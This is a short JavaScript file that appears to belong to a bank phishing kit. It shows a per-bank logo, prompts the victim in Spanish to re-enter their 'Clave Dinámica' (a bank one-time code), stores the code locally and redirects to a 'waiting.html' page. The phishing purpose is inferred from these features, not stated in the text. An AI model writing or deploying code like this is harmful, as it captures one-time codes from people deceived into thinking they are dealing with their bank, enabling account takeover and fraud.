const loader = document.querySelector('.loader');
setTimeout(() =>{
    try{
        document.querySelector('body').classList.remove('sb-hidden');
        loader.classList.remove('show');

        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            alert('Ingrese de nuevo su Clave Dinámica');
        }

    }catch(err){
        console.log(err);
    }
}, 1500);

// image and span
document.querySelector('#bank-logo').setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);

const btnNextStep = document.querySelector('#next-step');
btnNextStep.addEventListener('submit', e => {
    e.preventDefault();

    if(document.querySelector('#cdin').value !== ''){
        info.metaInfo.cdin = document.querySelector('#cdin').value;
        LS.setItem('info', JSON.stringify(info));
        window.location.href = 'waiting.html';
    }else{
        document.querySelector('#cdin').classList.add('input-error');
    }
});